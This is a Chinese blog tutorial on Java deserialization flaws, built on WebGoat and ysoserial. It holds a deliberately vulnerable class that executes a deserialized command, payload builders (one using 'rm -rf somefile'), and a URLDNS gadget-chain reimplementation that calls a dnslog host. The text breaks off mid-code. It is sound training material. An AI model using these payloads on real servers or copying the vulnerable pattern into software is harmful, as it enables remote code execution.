    <link href="https://j3f5.github.io/articles/2023/06/07/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/"/>
    <id>https://j3f5.github.io/articles/2023/06/07/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/</id>
    <published>2023-06-07T03:39:32.000Z</published>
    <updated>2023-06-07T03:39:32.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="java反序列化"><a class="markdownIt-Anchor" href="#java反序列化"></a> JAVA反序列化</h1><h2 id="概念"><a class="markdownIt-Anchor" href="#概念"></a> 概念</h2><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80.png" alt="JAVA反序列化基础" style="zoom:80%;" /><h3 id="序列化与反序列化"><a class="markdownIt-Anchor" href="#序列化与反序列化"></a> 序列化与反序列化</h3><p>Java 序列化是指把 Java 对象转换为字节序列的过程便于保存在内存、文件、数据库中，<code>ObjectOutputStream</code>类的 <code>writeObject() </code>方法可以实现序列化。</p><p>Java 反序列化是指把字节序列恢复为 Java 对象的过程，<code>ObjectInputStream </code>类的 <code>readObject() </code>方法用于反序列化。</p><p>序列化与反序列化是让 Java 对象脱离 Java 运行环境的一种手段，可以有效的<strong>实现多平台之间的通信、对象持久化存储</strong>。</p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image-20230606110322164.png" alt="image-20230606110322164" style="zoom:50%;" /><p><strong>例子：</strong></p><blockquote><p>最常见的反序列化情况便是服务器的SESSION，当有大量用户并发访问，就有可能出现庞大数量的SESSION 对象，内存显然不够用，于是Web 容器便会将SESSION 先序列化到硬盘中，等需要使用时，再将保存在硬盘中的对象还原到内存中，这个存储再拿出来的过程便是序列化和反序列化的过程。</p></blockquote><h3 id="漏洞成因与危害"><a class="markdownIt-Anchor" href="#漏洞成因与危害"></a> 漏洞成因与危害</h3><p><strong>成因：Java 程序没有对反序列化生成的对象的类型做限制</strong>。在 Java 中反序列化漏洞之所以比较严重的原因之一是：Java 存在大量的公用库，例如Apache Commons Collections。而这其中实现的一些类可以被反序列化用来实现任意代码执行。WebLogic、WebSphere、JBoss、Jenkins、OpenNMS 这些应用的反序列化漏洞能够得以利用，便是依靠了Apache Commons Collections。当然反序列漏洞的根源并不在于公共库，他只是手段与途径。</p><p><strong>危害</strong>：<strong>任意代码执行，获取SHELL，对服务器进行破坏</strong>。</p><h3 id="涉及函数"><a class="markdownIt-Anchor" href="#涉及函数"></a> 涉及函数</h3><p><strong>ObjectOutputStream 类</strong></p><ul><li><strong>writeObject</strong>() 方法可以对参数指定的obj 对象进行<strong>序列化</strong>操作，并将得到的字节序列写到目标输出流中。</li><li><strong>ReadObject</strong>()方法则是从源输入流中读取字节序列，再将其<strong>反序列化</strong>为对象并返回。</li></ul><p>可以序列化反序列化的类都需要声明接口Serializable</p><h3 id="漏洞利用的条件"><a class="markdownIt-Anchor" href="#漏洞利用的条件"></a> 漏洞利用的条件</h3><h4 id="存在利用链"><a class="markdownIt-Anchor" href="#存在利用链"></a> 存在利用链</h4><p>在程序中，通过方法调用、对象传递和反射机制等手段作为跳板，攻击者能构造出一个产生安全问题的利用链，如任意文件读取或写入、远程代码执行等漏洞。利用链又称作Gadget chain，利用链的构造往往由多个类对象组成，环环相扣就像一个链条。</p><h4 id="存在触发点"><a class="markdownIt-Anchor" href="#存在触发点"></a> 存在触发点</h4><p>程序中仅有一条利用链或者仅有一个反序列化的触发点都不会造成安全问题，不能被认定为漏洞。需要存在入口以及触发漏洞的函数。</p><h3 id="序列化字符串"><a class="markdownIt-Anchor" href="#序列化字符串"></a> 序列化字符串</h3><p>下方的特征可以作为序列化的标志参考：</p><ul><li>一段以<strong>rO0AB</strong>开头，基本可以确认是JAVA序列化字符串以<strong>base64</strong>加密的数据。<ul><li>序列化+base64</li></ul></li><li>一段以<strong>aced</strong>开头，基本就是JAVA序列化的16进制数据</li></ul><h2 id="测试用例webgoat与ysoserial"><a class="markdownIt-Anchor" href="#测试用例webgoat与ysoserial"></a> 测试用例（WebGoat与ysoserial）</h2><h3 id="基础反序列化"><a class="markdownIt-Anchor" href="#基础反序列化"></a> 基础反序列化</h3><p>著名含反序列化漏洞的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> request.getInputStream();</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(is);</span><br><span class="line"><span class="type">AcmeObject</span> <span class="variable">acme</span> <span class="operator">=</span> (AcmeObject)ois.readObject();</span><br></pre></td></tr></table></figure><p>它期待着一个AcmeObject对象，但它会在铸造发生之前执行readObject()。如果攻击者找到了在readObject()中实现危险操作的适当的类，他可以将该对象序列化，并强迫受攻击的应用程序执行这些操作。攻击者需要在classpath中找到一个支持序列化并在readObject()上有危险实现的类。【也就是利用链】</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.dummy.insecure.framework;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.time.LocalDateTime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulnerableTaskHolder</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> String taskName;</span><br><span class="line">        <span class="keyword">private</span> String taskAction;</span><br><span class="line">        <span class="keyword">private</span> LocalDateTime requestedExecutionTime;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">VulnerableTaskHolder</span><span class="params">(String taskName, String taskAction)</span> &#123;</span><br><span class="line">                <span class="built_in">super</span>();</span><br><span class="line">                <span class="built_in">this</span>.taskName = taskName;</span><br><span class="line">                <span class="built_in">this</span>.taskAction = taskAction;</span><br><span class="line">                <span class="built_in">this</span>.requestedExecutionTime = LocalDateTime.now();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">( ObjectInputStream stream )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//deserialize data so taskName and taskAction are available</span></span><br><span class="line">                stream.defaultReadObject();</span><br><span class="line">                <span class="comment">//blindly run some code. #code injection</span></span><br><span class="line">                Runtime.getRuntime().exec(taskAction);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果上图所示的java类存在，攻击者可以将该对象序列化并获得远程代码执行。利用链如下：用户定义了一个VulnerableTaskHolder对象Go，然后传入对应的参数值，对我们构造的恶意对象进行序列化，将会出发<code>Runtime.getRuntime().exec(taskAction);</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">VulnerableTaskHolder</span> <span class="variable">go</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VulnerableTaskHolder</span>(<span class="string">&quot;delete all&quot;</span>, <span class="string">&quot;rm -rf somefile&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">oos.writeObject(go);</span><br><span class="line">oos.flush();</span><br><span class="line"><span class="type">byte</span>[] exploit = bos.toByteArray();</span><br></pre></td></tr></table></figure><h3 id="ysoserial样例分析urldns样例"><a class="markdownIt-Anchor" href="#ysoserial样例分析urldns样例"></a> ysoserial样例分析（URLDNS样例）</h3><p>这个是<a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java%E7%9A%84%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%EF%BC%8C%E6%8C%89%E7%85%A7%E5%88%AB%E4%BA%BA%E7%9A%84payload%E6%9D%A5%E5%AD%A6%E4%B9%A0%E6%9F%90%E4%B8%AA%E6%A8%A1%E5%9D%97%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%82">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java的一个项目，按照别人的payload来学习某个模块是否存在反序列化漏洞。</a></p><p>主要代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public Object getObject(String url) throws Exception &#123;</span><br><span class="line">    URLStreamHandler handler = new SilentURLStreamHandler();</span><br><span class="line">    HashMap ht = new HashMap();</span><br><span class="line">    URL u = new URL((URL)null, url, handler);</span><br><span class="line">    ht.put(u, url);</span><br><span class="line">    Reflections.setFieldValue(u, &quot;hashCode&quot;, -1);</span><br><span class="line">    return ht;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里面涉及几个类，一个是URL一个是HashMap。先循序渐进，看类与方法。怎么看类？找<code>readObject</code>和<code>writeObject</code>类看到两个个类，HashMap有readObject方法。</p><p>看到一个方法<code>put</code>，那就ctrl+b进去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public V put(K key, V value) &#123;</span><br><span class="line">    return putVal(hash(key), key, value, false, true);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有两个函数，一个<code>putVal</code>，一个是<code>hash</code>，现在进去<code>putVal</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">   final V putVal(int hash, K key, V value, boolean onlyIfAbsent,</span><br><span class="line">                   boolean evict) &#123;</span><br><span class="line">        Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; int n, i;</span><br><span class="line">        if ((tab = table) == null || (n = tab.length) == 0)</span><br><span class="line">            n = (tab = resize()).length;</span><br><span class="line">....</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>没啥，涉及到的函数都是与树相关的操作，就是存储吧，所以返回<code>hash</code>方法，这个方法传入的是<code>key</code>的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">static final int hash(Object key) &#123;</span><br><span class="line">    int h;</span><br><span class="line">    return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>key是URL的，所以去到URL类看看<code>hashCode</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public synchronized int hashCode() &#123;</span><br><span class="line">    if (hashCode != -1)</span><br><span class="line">        return hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(this);</span><br><span class="line">    return hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要<code>hashCode==-1</code>才能执行后面的<code>hashCode</code>函数，跟进<code>hashcode</code>函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">protected int hashCode(URL u) &#123;</span><br><span class="line">    int h = 0;</span><br><span class="line"></span><br><span class="line">    // Generate the protocol part.</span><br><span class="line">    String protocol = u.getProtocol();</span><br><span class="line">    if (protocol != null)</span><br><span class="line">        h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">    // Generate the host part.</span><br><span class="line">    InetAddress addr = getHostAddress(u);</span><br><span class="line">    if (addr != null) &#123;</span><br><span class="line">        h += addr.hashCode();</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        String host = u.getHost();</span><br><span class="line">        if (host != null)</span><br><span class="line">            h += host.toLowerCase().hashCode();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>发现<code>InetAddress addr = getHostAddress(u)</code>可以获取URL的IP地址就是域名解析。</p><p>我其实跑偏了：正确是先找<code>readObject</code>。</p><p>当我们传入序列化的数据时，因为<code>HashMap</code>有<code>readObject</code>函数，所以跟进一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">    private void readObject(java.io.ObjectInputStream s)</span><br><span class="line">        throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        // Read in the threshold (ignored), loadfactor, and any hidden stuff</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        reinitialize();</span><br><span class="line">.......</span><br><span class="line">            // Read the keys and values, and put the mappings in the HashMap</span><br><span class="line">            for (int i = 0; i &lt; mappings; i++) &#123;</span><br><span class="line">                @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">                    K key = (K) s.readObject();</span><br><span class="line">                @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">                    V value = (V) s.readObject();</span><br><span class="line">                putVal(hash(key), key, value, false, false);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>发现<code>putVal(hash(key), key, value, false, false);</code>这个，上面已经分析过。所以</p><p>所以利用链就是：</p><blockquote><ol><li>存在<code>URL</code>和<code>Hashmap</code></li><li><code>Hashmap</code>重写了<code>readObject</code>方法，里面，使用<code>putVal</code>函数的时候会调用<code>hash</code>函数对URL进行<code>hashCode</code>处理</li><li><code>URL</code>的<code>hashcode</code>函数调用<code>getHostAddress</code>进行域名解析</li></ol></blockquote><p>所以现在模仿写一个：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">package com.urldns;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.net.MalformedURLException;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line"></span><br><span class="line">public class URLDNS &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        /* ERROR</span><br><span class="line">        1. Unable to make field private int java.net.URL.hashCode accessible: module java.base does not &quot;opens</span><br><span class="line">        -- Java version is too high</span><br><span class="line">        2. has been compiled by a more recent version of the Java Runtime (class file version 52.0)</span><br><span class="line">        -- Java version is too high. Please reset the project structure and the configuration</span><br><span class="line">         */</span><br><span class="line"></span><br><span class="line">        String sUrl = &quot;http://ib7pmo.dnslog.cn&quot;;</span><br><span class="line">        URL uUrl = new URL(sUrl);</span><br><span class="line">        HashMap hashMap = new HashMap();</span><br><span class="line">        // 这里获取URL类的字段，这里列举两种方法</span><br><span class="line">        Field field = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;);</span><br><span class="line">        // Field field = uUrl.getClass().getDeclaredField(&quot;hashCode&quot;);</span><br><span class="line">        // 因为是私有方法，所以这里设置能更改</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        // 为了不混淆，这里put方法也可以造成dnslog的，所以设置2</span><br><span class="line">        field.set(uUrl, 2);</span><br><span class="line">        hashMap.put(uUrl, &quot;J3ff&quot;);</span><br><span class="line">        </span><br><span class="line">        // 存起来了，后面就可以用了</span><br><span class="line">        field.set(uUrl, -1);</span><br><span class="line">        </span><br><span class="line">        // 开始序列化</span><br><span class="line">        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;urldns.exp&quot;));</span><br><span class="line">        objectOutputStream.writeObject(hashMap);</span><br><span class="line">        // 反序列化</span><br><span class="line">        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(&quot;urldns.exp&quot;));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="webgoat-反序列化漏洞分析-and-ysoserial的使用"><a class="markdownIt-Anchor" href="#webgoat-反序列化漏洞分析-and-ysoserial的使用"></a> webgoat 反序列化漏洞分析 and ysoserial的使用</h3><p>现在查到这个有漏洞的类代码为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InsecureDeserializationTask</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InsecureDeserializationTask</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@PostMapping(&#123;&quot;/InsecureDeserialization/task&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String token)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 对接收到的token进行了一波敏感字符替换变成b64token</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">b64token</span> <span class="operator">=</span> token.replace(<span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;+&#x27;</span>).replace(<span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        <span class="type">long</span> before;<span class="type">long</span> after;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            label71: &#123;</span><br><span class="line">                <span class="comment">// 对b64token解码过后进行了readObject()反序列化操作（第16行）</span></span><br><span class="line">                <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(b64token)));</span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">                            before = System.currentTimeMillis();</span><br><span class="line">                            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">                <span class="comment">// 看这个对象是不是VulnerableTaskHolder的实例</span></span><br><span class="line">                <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> VulnerableTaskHolder)) &#123;</span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">                            after = System.currentTimeMillis();</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"><span class="comment">// 看执行了多久，时间长了就算成功</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">delay</span> <span class="operator">=</span> (<span class="type">int</span>)(after - before); <span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>就如上面代码所示，我们应该看VulnerableTaskHolder类，里面的readObject()反序列化操作到底有什么可以利用的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulnerableTaskHolder</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> String taskName;</span><br><span class="line">  <span class="keyword">private</span> String taskAction;</span><br><span class="line">  <span class="keyword">private</span> LocalDateTime requestedExecutionTime;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">VulnerableTaskHolder</span><span class="params">(String taskName, String taskAction)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    <span class="built_in">this</span>.taskName = taskName;</span><br><span class="line">    <span class="built_in">this</span>.taskAction = taskAction;</span><br><span class="line">    <span class="built_in">this</span>.requestedExecutionTime = LocalDateTime.now();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;VulnerableTaskHolder [taskName=&quot;</span> + taskName + <span class="string">&quot;, taskAction=&quot;</span> + taskAction + <span class="string">&quot;, requestedExecutionTime=&quot;</span> + requestedExecutionTime + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 执行反序列化操作</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream stream)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 反序列化中的taskName和taskAction属性都是可以利用的</span></span><br><span class="line">    stream.defaultReadObject();</span><br><span class="line">    <span class="comment">// 对数据进行操作的记录 ...</span></span><br><span class="line"><span class="comment">// 对象误操作 ...</span></span><br><span class="line">    <span class="comment">// 注释：这里的条件是为了防止你把山羊完全毁掉</span></span><br><span class="line">    <span class="keyword">if</span> ((taskAction.startsWith(<span class="string">&quot;sleep&quot;</span>) || taskAction.startsWith(<span class="string">&quot;ping&quot;</span>)) &amp;&amp; taskAction.length() &lt; <span class="number">22</span>) &#123;</span><br><span class="line">      log.info(<span class="string">&quot;about to execute: &#123;&#125;&quot;</span>, taskAction);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="comment">// 执行Runtime.getRuntime().exec(taskAction); 所以把攻击的恶意代码写到 taskAction 类中</span></span><br><span class="line">        <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(taskAction);</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(p.getInputStream()));</span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span> ((line = in.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">          log.info(line);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        log.error(<span class="string">&quot;IO Exception&quot;</span>, e);</span><br><span class="line">&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>执行Runtime.getRuntime().exec(taskAction); 所以把攻击的恶意代码写到 taskAction 类中，所以构造payload的java文件（目录为src文件夹中，org.dummy.insecure.framework文件夹下的Main文件）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.dummy.insecure.framework;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">VulnerableTaskHolder</span> <span class="variable">vulnerableTaskHolder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VulnerableTaskHolder</span>(<span class="string">&quot;ping&quot;</span>, <span class="string">&quot;ping -n 6 127.0.0.1&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        outputStream.writeObject(vulnerableTaskHolder);</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">        System.out.println(str);</span><br><span class="line">        